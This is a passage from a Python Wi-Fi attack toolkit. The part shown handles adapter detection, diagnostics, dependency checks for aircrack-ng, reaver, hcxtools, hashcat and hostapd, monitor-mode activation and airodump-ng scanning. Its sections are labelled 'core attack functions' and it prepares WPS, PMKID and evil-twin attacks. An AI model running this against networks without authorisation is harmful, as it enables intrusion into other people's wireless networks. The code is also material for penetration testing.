        f" {Colors.GREEN}✓{Colors.RESET} Found {len(wireless_cards)} wireless interface(s)\n"
    )

    print(
        f"{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}║{Colors.WHITE}                          AVAILABLE WIRELESS CARDS                          {Colors.GREEN}║{Colors.RESET}"
    )
    print(
        f"{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    for i, card in enumerate(wireless_cards, 1):
        # Get card information
        code, driver, _ = run_command(
            f"ethtool -i {card} 2>/dev/null | grep 'driver:' | awk '{{print $2}}'"
        )
        driver = driver.strip() or "unknown"

        code, mac, _ = run_command(
            f"ip link show {card} 2>/dev/null | grep 'link/ether' | awk '{{print $2}}'"
        )
        mac = mac.strip() or "N/A"

        code, ssid, _ = run_command(
            f"iwconfig {card} 2>/dev/null | grep 'ESSID:' | awk -F'\"' '{{print $2}}'"
        )
        ssid = ssid.strip()

        if ssid and ssid != "off/any":
            status = f"{Colors.GREEN}Connected to: {ssid}{Colors.RESET}"
        else:
            status = f"{Colors.GRAY}Disconnected{Colors.RESET}"

        code, monitor, _ = run_command(
            f"iw {card} info 2>/dev/null | grep -q monitor && echo 'yes' || echo 'no'"
        )
        monitor_support = (
            f"{Colors.GREEN}✓ Monitor Mode{Colors.RESET}"
            if "yes" in monitor
            else f"{Colors.RED}✗ No Monitor{Colors.RESET}"
        )

        code, power, _ = run_command(
            f"iwconfig {card} 2>/dev/null | grep -o 'Tx-Power=[0-9]*' | cut -d= -f2"
        )
        power = power.strip() or "N/A"

        print(f"{Colors.PURPLE}┌─ Interface {Colors.WHITE}#{i}{Colors.RESET}")
        print(f"{Colors.PURPLE}│{Colors.RESET}")
        print(
            f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}Interface:{Colors.RESET} {Colors.CYAN}{card}{Colors.RESET}"
        )
        print(
            f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}Driver:{Colors.RESET} {Colors.BLUE}{driver}{Colors.RESET}"
        )
        print(
            f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}MAC Address:{Colors.RESET} {Colors.WHITE}{mac}{Colors.RESET}"
        )
        print(
            f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}Status:{Colors.RESET} {status}"
        )
        print(
            f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}Monitor Mode:{Colors.RESET} {monitor_support}"
        )
        print(
            f"{Colors.PURPLE}├─{Colors.RESET} {Colors.BOLD}TX Power:{Colors.RESET} {Colors.YELLOW}{power} dBm{Colors.RESET}"
        )
        print(
            f"{Colors.PURPLE}└─{Colors.RESET} {Colors.BOLD}Capabilities:{Colors.RESET} {Colors.GRAY}802.11 Wireless{Colors.RESET}"
        )
        print()

    return wireless_cards


def select_network_card(specified_card: Optional[str] = None) -> str:
    """Select a network card for use."""
    if specified_card:
        code, _, _ = run_command(f"iwconfig {specified_card}")
        if code == 0:
            print(
                f"{Colors.GREEN}[+]{Colors.RESET} Using specified card: {Colors.BLUE}{specified_card}{Colors.RESET}\n"
            )
            return specified_card
        else:
            print(
                f"{Colors.RED}[!]{Colors.RESET} Specified card '{specified_card}' is not valid or not wireless\n"
            )

    wireless_cards = detect_wireless_cards()

    if len(wireless_cards) == 1:
        card = wireless_cards[0]
        print(
            f"{Colors.GREEN}[+]{Colors.RESET} Only one card available: {Colors.BLUE}{card}{Colors.RESET}"
        )
        confirm = input(
            f"{Colors.YELLOW}[*]{Colors.RESET} Continue with this card? [Y/n]: "
        ).strip()

        if confirm.lower() == "n":
            print(f"{Colors.RED}[!]{Colors.RESET} Operation cancelled by user\n")
            sys.exit(0)

        print(
            f"{Colors.GREEN}[+]{Colors.RESET} Using card: {Colors.BLUE}{card}{Colors.RESET}\n"
        )
        return card

    while True:
        selection = input(
            f"{Colors.YELLOW}[*]{Colors.RESET} Select a network card [1-{len(wireless_cards)}] or 'r' to refresh: "
        ).strip()

        if selection.lower() == "r":
            print(f"{Colors.YELLOW}[*]{Colors.RESET} Refreshing card list...\n")
            wireless_cards = detect_wireless_cards()
            continue

        try:
            index = int(selection) - 1
            if 0 <= index < len(wireless_cards):
                card = wireless_cards[index]

                print(f"\n{Colors.GREEN}[+]{Colors.RESET} You selected:")
                code, driver, _ = run_command(
                    f"ethtool -i {card} 2>/dev/null | grep 'driver:' | awk '{{print $2}}'"
                )
                driver = driver.strip() or "Unknown"
                print(
                    f"\t{Colors.PURPLE}Interface:{Colors.RESET} {Colors.BLUE}{card}{Colors.RESET}"
                )
                print(f"\t{Colors.PURPLE}Driver:{Colors.RESET} {driver}")

                confirm = input(
                    f"\n{Colors.YELLOW}[*]{Colors.RESET} Confirm selection? [Y/n]: "
                ).strip()

                if confirm.lower() != "n":
                    print(
                        f"{Colors.GREEN}[+]{Colors.RESET} Card confirmed: {Colors.BLUE}{card}{Colors.RESET}\n"
                    )
                    return card

                print(f"{Colors.YELLOW}[*]{Colors.RESET} Select another card...\n")
            else:
                print(
                    f"{Colors.RED}[!]{Colors.RESET} Invalid selection. Choose 1-{len(wireless_cards)} or 'r'\n"
                )
        except ValueError:
            print(
                f"{Colors.RED}[!]{Colors.RESET} Invalid input. Enter a number or 'r'\n"
            )


# ═══════════════════════════════════════════════════════════════════════════════
#                           CORE ATTACK FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════


def wifi_diagnostic():
    """Diagnóstico completo del adaptador WiFi con soporte universal"""
    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                📡 WIRELESSPEN - WIRELESS ADAPTER DIAGNOSTICS             {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    if not state.network_card:
        print(
            f"{Colors.RED}[!]{Colors.RESET} No se ha seleccionado ninguna tarjeta de red"
        )
        return False

    interface = state.network_card
    diagnostic_success = True

    # 1. Información básica de la interfaz
    print(
        f"{Colors.YELLOW}[1/8]{Colors.RESET} {Colors.BOLD}Información de la Interfaz:{Colors.RESET}"
    )
    code, output, _ = run_command(f"ip link show {interface}")
    if code == 0:
        print(f"  {Colors.GREEN}✓{Colors.RESET} Interfaz detectada correctamente")
        for line in output.strip().split("\n")[:2]:
            print(f"    {line}")
    else:
        print(
            f"  {Colors.RED}✗{Colors.RESET} No se pudo obtener información de la interfaz"
        )
        diagnostic_success = False

    # 2. Información del driver y chipset
    print(
        f"\n{Colors.YELLOW}[2/8]{Colors.RESET} {Colors.BOLD}Driver y Chipset:{Colors.RESET}"
    )
    code, driver_info, _ = run_command(f"ethtool -i {interface} 2>/dev/null")
    if code == 0 and driver_info:
        print(f"  {Colors.GREEN}✓{Colors.RESET} Información del driver:")
        for line in driver_info.strip().split("\n"):
            if line.strip():
                print(f"    {line}")

        # Detectar el driver específico
        driver_lower = driver_info.lower()
        if "rtl8" in driver_lower:
            print(f"\n    {Colors.CYAN}→ Chipset Realtek detectado{Colors.RESET}")
        elif "mt7" in driver_lower or "mediatek" in driver_lower:
            print(f"\n    {Colors.CYAN}→ Chipset MediaTek detectado{Colors.RESET}")
        elif "ath" in driver_lower:
            print(f"\n    {Colors.CYAN}→ Chipset Atheros detectado{Colors.RESET}")
        elif "iwl" in driver_lower:
            print(f"\n    {Colors.CYAN}→ Chipset Intel detectado{Colors.RESET}")
        elif "brcm" in driver_lower or "b43" in driver_lower:
            print(f"\n    {Colors.CYAN}→ Chipset Broadcom detectado{Colors.RESET}")
    else:
        print(
            f"  {Colors.RED}✗{Colors.RESET} No se pudo obtener información del driver"
        )

    # 3. Dispositivos USB WiFi
    print(
        f"\n{Colors.YELLOW}[3/8]{Colors.RESET} {Colors.BOLD}Dispositivos USB WiFi:{Colors.RESET}"
    )
    vendors = "wireless|wifi|802.11|network|tp-link|realtek|ralink|mediatek|atheros|broadcom|intel"
    code, usb_output, _ = run_command(f"lsusb | grep -iE '{vendors}'")
    if code == 0 and usb_output.strip():
        print(f"  {Colors.GREEN}✓{Colors.RESET} Adaptadores WiFi USB detectados:")
        for line in usb_output.strip().split("\n"):
            if line.strip():
                print(f"    {line}")
    else:
        print(
            f"  {Colors.YELLOW}⚠{Colors.RESET} No se detectaron adaptadores WiFi USB o es un adaptador interno"
        )

    # 4. Módulos del kernel cargados
    print(
        f"\n{Colors.YELLOW}[4/8]{Colors.RESET} {Colors.BOLD}Módulos del Kernel:{Colors.RESET}"
    )
    code, modules, _ = run_command(
        "lsmod | grep -E '^(rtl|mt7|ath|iwl|brcm|b43|carl|ar9|rt2)' | head -10"
    )
    if code == 0 and modules.strip():
        print(f"  {Colors.GREEN}✓{Colors.RESET} Módulos WiFi cargados:")
        for line in modules.strip().split("\n"):
            if line.strip():
                print(f"    {line}")
    else:
        print(f"  {Colors.RED}✗{Colors.RESET} No se detectaron módulos WiFi cargados")
        diagnostic_success = False

    # 5. Capacidades del adaptador
    print(
        f"\n{Colors.YELLOW}[5/8]{Colors.RESET} {Colors.BOLD}Capacidades del Adaptador:{Colors.RESET}"
    )
    code, capabilities, _ = run_command(
        "iw list 2>/dev/null | grep -A 10 'Supported interface modes'"
    )
    if code == 0 and capabilities.strip():
        print(f"  {Colors.GREEN}✓{Colors.RESET} Modos soportados:")
        for line in capabilities.strip().split("\n"):
            if line.strip() and "*" in line:
                print(f"    {line.strip()}")
    else:
        print(
            f"  {Colors.YELLOW}⚠{Colors.RESET} No se pudo obtener información de capacidades"
        )

    # 6. Estado actual de la interfaz
    print(
        f"\n{Colors.YELLOW}[6/8]{Colors.RESET} {Colors.BOLD}Estado de la Interfaz:{Colors.RESET}"
    )
    code, status, _ = run_command(f"iwconfig {interface} 2>/dev/null")
    if code == 0 and status.strip():
        print(f"  {Colors.GREEN}✓{Colors.RESET} Configuración actual:")
        for line in status.strip().split("\n")[:3]:
            if line.strip():
                print(f"    {line}")
    else:
        print(f"  {Colors.RED}✗{Colors.RESET} No se pudo obtener estado de la interfaz")

    # 7. Verificar modo monitor
    print(
        f"\n{Colors.YELLOW}[7/8]{Colors.RESET} {Colors.BOLD}Verificación Modo Monitor:{Colors.RESET}"
    )
    code, monitor_check, _ = run_command(
        f"iwconfig {interface} 2>/dev/null | grep -i monitor"
    )
    if code == 0 and monitor_check.strip():
        print(f"  {Colors.GREEN}✓{Colors.RESET} Adaptador en modo monitor")
    else:
        print(f"  {Colors.YELLOW}⚠{Colors.RESET} Adaptador en modo managed (normal)")

    # 8. Procesos que pueden interferir
    print(
        f"\n{Colors.YELLOW}[8/8]{Colors.RESET} {Colors.BOLD}Procesos que pueden interferir:{Colors.RESET}"
    )
    code, processes, _ = run_command(
        "ps aux | grep -iE 'network-manager|wpa_supplicant|dhclient' | grep -v grep"
    )
    if code == 0 and processes.strip():
        print(
            f"  {Colors.YELLOW}⚠{Colors.RESET} Procesos detectados que pueden interferir:"
        )
        for line in processes.strip().split("\n")[:5]:
            if line.strip():
                print(f"    {line[:100]}...")
    else:
        print(
            f"  {Colors.GREEN}✓{Colors.RESET} No se detectaron procesos interferentes"
        )

    # Resumen del diagnóstico
    print(f"\n{Colors.CYAN}{'='*80}{Colors.RESET}")
    if diagnostic_success:
        print(
            f"{Colors.GREEN}✓{Colors.RESET} {Colors.BOLD}Diagnóstico completado exitosamente{Colors.RESET}"
        )
    else:
        print(
            f"{Colors.YELLOW}⚠{Colors.RESET} {Colors.BOLD}Diagnóstico completado con advertencias{Colors.RESET}"
        )
    print(f"{Colors.CYAN}{'='*80}{Colors.RESET}\n")

    return True


def check_dependencies() -> bool:
    """
    Comprehensive system dependency checker with detailed diagnostics.

    Returns:
        True if all required dependencies are met, False otherwise
    """
    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                    📦 DEPENDENCY VERIFICATION SYSTEM                      {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    # Enhanced dependency definitions with versions and packages
    dependencies = {
        "core": {
            "aircrack-ng": {
                "cmd": "aircrack-ng",
                "pkg": "aircrack-ng",
                "min_version": "1.5",
                "critical": True,
            },
            "airodump-ng": {
                "cmd": "airodump-ng",
                "pkg": "aircrack-ng",
                "min_version": "1.5",
                "critical": True,
            },
            "aireplay-ng": {
                "cmd": "aireplay-ng",
                "pkg": "aircrack-ng",
                "min_version": "1.5",
                "critical": True,
            },
            "airmon-ng": {
                "cmd": "airmon-ng",
                "pkg": "aircrack-ng",
                "min_version": "1.5",
                "critical": True,
            },
            "iwconfig": {
                "cmd": "iwconfig",
                "pkg": "wireless-tools",
                "min_version": "30",
                "critical": True,
            },
            "iw": {"cmd": "iw", "pkg": "iw", "min_version": "5.0", "critical": True},
            "macchanger": {
                "cmd": "macchanger",
                "pkg": "macchanger",
                "min_version": "1.7",
                "critical": True,
            },
            "ethtool": {
                "cmd": "ethtool",
                "pkg": "ethtool",
                "min_version": "5.0",
                "critical": True,
            },
        },
        "wps": {
            "reaver": {
                "cmd": "reaver",
                "pkg": "reaver",
                "min_version": "1.6",
                "critical": False,
            },
            "wash": {
                "cmd": "wash",
                "pkg": "reaver",
                "min_version": "1.6",
                "critical": False,
            },
            "bully": {
                "cmd": "bully",
                "pkg": "bully",
                "min_version": "1.1",
                "critical": False,
            },
        },
        "pmkid": {
            "hcxdumptool": {
                "cmd": "hcxdumptool",
                "pkg": "hcxtools",
                "min_version": "6.0",
                "critical": False,
            },
            "hcxpcapngtool": {
                "cmd": "hcxpcapngtool",
                "pkg": "hcxtools",
                "min_version": "6.0",
                "critical": False,
            },
            "hashcat": {
                "cmd": "hashcat",
                "pkg": "hashcat",
                "min_version": "6.0",
                "critical": False,
            },
        },
        "evil_twin": {
            "hostapd": {
                "cmd": "hostapd",
                "pkg": "hostapd",
                "min_version": "2.9",
                "critical": False,
            },
            "dnsmasq": {
                "cmd": "dnsmasq",
                "pkg": "dnsmasq",
                "min_version": "2.80",
                "critical": False,
            },
        },
    }

    missing_critical = []
    missing_optional = []
    available_features = []

    # Check each category
    for category, tools in dependencies.items():
        print(f"{Colors.YELLOW}🔧 {category.upper()} TOOLS:{Colors.RESET}")
        category_available = True

        for tool_name, tool_info in tools.items():
            cmd = tool_info["cmd"]
            pkg = tool_info["pkg"]
            critical = tool_info["critical"]

            # Check if command exists
            code, stdout, _ = run_command(f"which {cmd} 2>/dev/null", timeout=5)

            if code == 0:
                # Get version info
                version_cmd = f"{cmd} --version 2>/dev/null | head -1"
                ver_code, ver_out, _ = run_command(version_cmd, timeout=5)

                version_match = re.search(r"(\d+\.[\d\.]+)", ver_out)
                version = version_match.group(1) if version_match else "unknown"

                print(
                    f"  {Colors.SUCCESS} {tool_name:<15} {Colors.GREEN}v{version}{Colors.RESET} {Colors.GRAY}({cmd}){Colors.RESET}"
                )
            else:
                if critical:
                    print(
                        f"  {Colors.FAILURE} {tool_name:<15} {Colors.RED}Missing{Colors.RESET} {Colors.GRAY}({pkg}){Colors.RESET}"
                    )
                    missing_critical.append(tool_name)
                    category_available = False
                else:
                    print(
                        f"  {Colors.WARNING} {tool_name:<15} {Colors.YELLOW}Optional{Colors.RESET} {Colors.GRAY}({pkg}){Colors.RESET}"
                    )
                    missing_optional.append(tool_name)

        if category_available and category != "core":
            available_features.append(category.replace("_", " ").title())

        print()

    # System information
    print(f"{Colors.YELLOW}🖥️  SYSTEM ENVIRONMENT:{Colors.RESET}")

    # Check Python version
    py_version = (
        f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
    )
    min_py = tuple(map(int, MIN_PYTHON_VERSION.split(".")))
    current_py = (sys.version_info.major, sys.version_info.minor)

    if current_py >= min_py:
        print(
            f"  {Colors.SUCCESS} Python         {Colors.GREEN}{py_version}{Colors.RESET}"
        )
    else:
        print(
            f"  {Colors.FAILURE} Python         {Colors.RED}{py_version} (need {MIN_PYTHON_VERSION}+){Colors.RESET}"
        )
        missing_critical.append("python")

    # Check OS compatibility
    if platform.system() == "Linux":
        print(f"  {Colors.SUCCESS} Operating System {Colors.GREEN}Linux{Colors.RESET}")

        # Check if running as root
        if os.geteuid() == 0:
            print(f"  {Colors.SUCCESS} Privileges     {Colors.GREEN}Root{Colors.RESET}")
        else:
            print(
                f"  {Colors.FAILURE} Privileges     {Colors.RED}Non-root (required){Colors.RESET}"
            )
            missing_critical.append("root_privileges")
    else:
        print(
            f"  {Colors.WARNING} Operating System {Colors.YELLOW}{platform.system()} (Linux recommended){Colors.RESET}"
        )

    print()

    # Results summary
    print(
        f"{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                           DEPENDENCY CHECK RESULTS                          {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    if missing_critical:
        print(
            f"{Colors.FAILURE} {Colors.RED}CRITICAL DEPENDENCIES MISSING:{Colors.RESET}"
        )
        for dep in missing_critical:
            dep_info = None
            for category in dependencies.values():
                if dep in category:
                    dep_info = category[dep]
                    break

            if dep_info:
                print(f"    • {dep} ({dep_info['pkg']})")
            else:
                print(f"    • {dep}")

        print(f"\n{Colors.YELLOW}📋 INSTALLATION COMMANDS:{Colors.RESET}")
        print(f"  {Colors.CYAN}# Debian/Ubuntu:{Colors.RESET}")
        print(
            "  sudo apt update && sudo apt install -y aircrack-ng wireless-tools iw macchanger ethtool"
        )
        print(f"\n  {Colors.CYAN}# Arch Linux:{Colors.RESET}")
        print("  sudo pacman -S aircrack-ng wireless_tools iw macchanger ethtool")
        print(f"\n  {Colors.CYAN}# Kali Linux:{Colors.RESET}")
        print("  sudo apt update && sudo apt install -y kali-linux-wireless")
        print()
        return False

    print(
        f"{Colors.SUCCESS} {Colors.GREEN}ALL CRITICAL DEPENDENCIES SATISFIED{Colors.RESET}\n"
    )

    if available_features:
        print(
            f"{Colors.INFO} {Colors.CYAN}Available features:{Colors.RESET} {', '.join(available_features)}"
        )

    if missing_optional:
        print(
            f"{Colors.WARNING} {Colors.YELLOW}Optional tools missing:{Colors.RESET} {', '.join(missing_optional)}"
        )
        print(f"  {Colors.GRAY}Install for full functionality:{Colors.RESET}")
        print("  sudo apt install -y reaver bully hcxtools hashcat hostapd dnsmasq")

    print()
    return True


def handle_monitor_mode() -> bool:
    """
    Advanced monitor mode activation with intelligent fallback methods.

    Returns:
        True if monitor mode is successfully enabled, False otherwise
    """
    if not state.network_card:
        print(f"{Colors.FAILURE} No network card selected")
        return False

    interface = state.network_card

    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                      📡 MONITOR MODE ACTIVATION                            {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    print(f"{Colors.INFO} Target interface: {Colors.CYAN}{interface}{Colors.RESET}")

    # Check if already in monitor mode
    code, monitor_check, _ = run_command(
        f"iwconfig {interface} 2>/dev/null | grep -i monitor", timeout=10
    )
    if code == 0 and monitor_check.strip():
        print(f"{Colors.SUCCESS} Interface {interface} already in monitor mode")
        state.monitor_interface = interface
        return True

    print(f"{Colors.YELLOW}[1/5]{Colors.RESET} Checking interface capabilities...")

    # Check monitor mode support
    code, capabilities, _ = run_command(f"iw {interface} info 2>/dev/null", timeout=10)
    if code != 0:
        print(f"{Colors.FAILURE} Unable to get interface information")
        return False

    # Get interface type and mode support
    code, modes, _ = run_command(
        f"iw phy$(iw {interface} info | grep wiphy | awk '{{print $2}}') info 2>/dev/null | grep -A 10 'Supported interface modes'",
        timeout=10,
    )

    if "monitor" not in modes:
        print(f"{Colors.FAILURE} Interface does not support monitor mode")
        return False

    print(f"{Colors.SUCCESS} Monitor mode support confirmed")

    # Step 2: Kill interfering processes
    print(f"{Colors.YELLOW}[2/5]{Colors.RESET} Stopping interfering processes...")
    interfering_processes = [
        "NetworkManager",
        "wpa_supplicant",
        "dhclient",
        "wpa_cli",
        "dhcpcd",
        "avahi-daemon",
    ]

    for process in interfering_processes:
        run_command(
            f"systemctl stop {process} 2>/dev/null || service {process} stop 2>/dev/null || killall {process} 2>/dev/null",
            timeout=5,
        )

    # Use airmon-ng check kill for thorough cleanup
    run_command("airmon-ng check kill 2>/dev/null", timeout=10)
    time.sleep(2)

    # Step 3: Method 1 - Using iw/ip commands (modern approach)
    print(f"{Colors.YELLOW}[3/5]{Colors.RESET} Method 1: Modern iw/ip approach...")

    # Bring interface down
    run_command(f"ip link set {interface} down", timeout=5)
    time.sleep(1)

    # Set monitor mode using iw
    code, _, stderr = run_command(f"iw {interface} set type monitor", timeout=10)

    # Bring interface back up
    run_command(f"ip link set {interface} up", timeout=5)
    time.sleep(2)

    # Verify monitor mode
    code, monitor_check, _ = run_command(
        f"iwconfig {interface} 2>/dev/null | grep -i monitor", timeout=10
    )
    if code == 0 and monitor_check.strip():
        print(f"{Colors.SUCCESS} Monitor mode enabled using iw/ip")
        state.monitor_interface = interface
        return True

    # Step 4: Method 2 - Using iwconfig (legacy approach)
    print(f"{Colors.YELLOW}[4/5]{Colors.RESET} Method 2: Legacy iwconfig approach...")

    run_command(f"ip link set {interface} down", timeout=5)
    time.sleep(1)

    code, _, stderr = run_command(f"iwconfig {interface} mode monitor", timeout=10)

    run_command(f"ip link set {interface} up", timeout=5)
    time.sleep(2)

    # Verify monitor mode
    code, monitor_check, _ = run_command(
        f"iwconfig {interface} 2>/dev/null | grep -i monitor", timeout=10
    )
    if code == 0 and monitor_check.strip():
        print(f"{Colors.SUCCESS} Monitor mode enabled using iwconfig")
        state.monitor_interface = interface
        return True

    # Step 5: Method 3 - Using airmon-ng (automated approach)
    print(
        f"{Colors.YELLOW}[5/5]{Colors.RESET} Method 3: airmon-ng automated approach..."
    )

    code, airmon_output, _ = run_command(f"airmon-ng start {interface}", timeout=15)
    time.sleep(3)

    # Check for monitor interface created by airmon-ng
    possible_interfaces = [
        f"{interface}mon",
        f"{interface}mon0",
        f"{interface}mon1",
        interface,
        "wlan0mon",  # Common fallback
        "wlan1mon",
    ]

    for test_interface in possible_interfaces:
        code, monitor_check, _ = run_command(
            f"iwconfig {test_interface} 2>/dev/null | grep -i monitor", timeout=5
        )
        if code == 0 and monitor_check.strip():
            print(f"{Colors.SUCCESS} Monitor mode enabled using airmon-ng")
            print(
                f"{Colors.INFO} Monitor interface: {Colors.CYAN}{test_interface}{Colors.RESET}"
            )
            state.monitor_interface = test_interface

            # Update the network card to the new interface if it changed
            if test_interface != interface:
                print(
                    f"{Colors.WARNING} Interface name changed: {interface} → {test_interface}"
                )
                state.network_card = test_interface

            return True

    # If all methods fail, provide detailed troubleshooting
    print(
        f"\n{Colors.FAILURE} {Colors.RED}MONITOR MODE ACTIVATION FAILED{Colors.RESET}\n"
    )

    print(f"{Colors.YELLOW}🔧 TROUBLESHOOTING STEPS:{Colors.RESET}")
    print(f"  {Colors.ARROW} Check if interface supports monitor mode:")
    print(
        f"    {Colors.GRAY}iw phy$(iw {interface} info | grep wiphy | awk '{{print $2}}') info{Colors.RESET}"
    )
    print(f"\n  {Colors.ARROW} Manually try monitor mode:")
    print(f"    {Colors.GRAY}sudo ip link set {interface} down{Colors.RESET}")
    print(f"    {Colors.GRAY}sudo iw {interface} set type monitor{Colors.RESET}")
    print(f"    {Colors.GRAY}sudo ip link set {interface} up{Colors.RESET}")
    print(f"\n  {Colors.ARROW} Check for driver issues:")
    print(f"    {Colors.GRAY}dmesg | grep {interface}{Colors.RESET}")
    print(f"\n  {Colors.ARROW} Try USB replug (if applicable)")
    print(f"\n  {Colors.ARROW} Check for firmware issues:")
    print(f"    {Colors.GRAY}sudo dmesg | grep firmware{Colors.RESET}")

    return False


def scan_networks(
    scan_time: int = None, target_channel: str = None
) -> Optional[Dict[str, str]]:
    """
    Enhanced WiFi network scanner with filtering and advanced features.

    Args:
        scan_time: Scan duration in seconds (default from config)
        target_channel: Specific channel to scan (optional)

    Returns:
        Selected network dictionary or None if cancelled
    """
    if not state.monitor_interface:
        print(f"{Colors.FAILURE} Monitor mode not activated")
        return None

    interface = state.monitor_interface
    scan_duration = scan_time or CONFIG["DEFAULT_SCAN_TIME"]

    print(
        f"\n{Colors.CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}║{Colors.WHITE}                        📡 ADVANCED NETWORK SCANNER                        {Colors.CYAN}║{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n"
    )

    print(f"{Colors.INFO} Interface: {Colors.CYAN}{interface}{Colors.RESET}")
    print(f"{Colors.INFO} Scan time: {Colors.YELLOW}{scan_duration}s{Colors.RESET}")
    if target_channel:
        print(f"{Colors.INFO} Channel: {Colors.YELLOW}{target_channel}{Colors.RESET}")

    # Create scan directory
    os.makedirs(state.output_directory, exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    capture_file = os.path.join(state.output_directory, f"scan_{timestamp}")
    state.add_temp_file(f"{capture_file}-01.csv")
    state.add_temp_file(f"{capture_file}-01.cap")

    # Build airodump command
    cmd_parts = ["airodump-ng"]
    cmd_parts.extend(["--output-format", "csv"])
    cmd_parts.extend(["-w", capture_file])

    if target_channel:
        cmd_parts.extend(["--channel", target_channel])

    cmd_parts.append(interface)
    cmd = " ".join(cmd_parts)

    print(f"\n{Colors.YELLOW}🔍 Starting network scan...{Colors.RESET}")
    if state.verbose_mode:
        print(f"{Colors.GRAY}[DEBUG] Command: {cmd}{Colors.RESET}")

    # Start scanning with progress indicator
    try:
        proc = run_command_async(cmd)

        # Progress indicator
        for i in range(scan_duration):
            dots = "." * (i % 4)
            progress = (i + 1) / scan_duration * 100
            print(
                f"\r{Colors.CYAN}[{progress:5.1f}%]{Colors.RESET} Scanning{dots:<4} ({i+1}/{scan_duration}s)",
                end="",
                flush=True,
            )
            time.sleep(1)

        print(f"\r{Colors.SUCCESS} Scan completed ({scan_duration}s)" + " " * 20)

        # Stop the scan
        kill_process_group(proc)
        time.sleep(1)

    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING} Scan interrupted by user")
        try:
            kill_process_group(proc)
        except (ProcessLookupError, AttributeError):
            pass
        time.sleep(1)

    # Parse results
    csv_file = f"{capture_file}-01.csv"
    if not os.path.exists(csv_file):
        print(f"\n{Colors.FAILURE} No scan data generated")
        return None

    networks = parse_airodump_csv(csv_file)

    if not networks:
        print(f"\n{Colors.WARNING} No WiFi networks detected")
        print(f"\n{Colors.YELLOW}💡 TROUBLESHOOTING:{Colors.RESET}")
        print("  • Check antenna connection")
        print(
            f"  • Try different channels: {Colors.CYAN}--channel 1,6,11{Colors.RESET}"
        )
        print(f"  • Increase scan time: {Colors.CYAN}--scan-time 60{Colors.RESET}")
        return None

    # Sort networks by signal strength
    networks.sort(key=lambda x: int(x.get("power", "-100")), reverse=True)

    # Display results
    print(f"\n{Colors.SUCCESS} Found {len(networks)} networks\n")

    print(
        f"{Colors.CYAN}╭─────┬───────────────────┬────┬──────┬──────────┬─────────────────────────╮{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}│{Colors.BOLD}  #  {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} BSSID             {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} CH {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} PWR  {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} SECURITY {Colors.RESET}{Colors.CYAN}│{Colors.BOLD} ESSID                   {Colors.RESET}{Colors.CYAN}│{Colors.RESET}"
    )
    print(
        f"{Colors.CYAN}├─────┼───────────────────┼────┼──────┼──────────┼─────────────────────────┤{Colors.RESET}"
    )

    for i, net in enumerate(networks, 1):
        bssid = net.get("bssid", "N/A")[:17]
        channel = net.get("channel", "N/A")[:3]
        power = net.get("power", "N/A")
        encryption = net.get("encryption", "N/A")[:10]
        essid = net.get("essid", "<Hidden>")[:23]

        # Color coding for signal strength
        if power != "N/A":
            try:
                pwr_val = int(power)
                if pwr_val >= -50:
                    pwr_color = Colors.GREEN
                    # signal_bars = "████"  # Unused
                elif pwr_val >= -60:
                    pwr_color = Colors.LIME
                    # signal_bars = "███░"  # Unused
                elif pwr_val >= -70:
                    pwr_color = Colors.YELLOW
                    # signal_bars = "██░░"  # Unused
                elif pwr_val >= -80:
                    pwr_color = Colors.ORANGE
                    # signal_bars = "█░░░"  # Unused
                else:
                    pwr_color = Colors.RED
                    # signal_bars = "░░░░"  # Unused
                power_display = f"{pwr_color}{power:>4}{Colors.RESET}"
            except (ValueError, TypeError):
                power_display = f"{Colors.GRAY}{power:>4}{Colors.RESET}"
        else:
            power_display = f"{Colors.GRAY} N/A{Colors.RESET}"
            # signal_bars = "░░░░"  # Reserved for future use

        # Color coding for encryption
        if "WPA3" in encryption:
            enc_color = Colors.PURPLE
        elif "WPA2" in encryption:
            enc_color = Colors.GREEN
        elif "WPA" in encryption:
            enc_color = Colors.YELLOW
        elif "WEP" in encryption:
            enc_color = Colors.ORANGE
        else:
            enc_color = Colors.RED

        print(
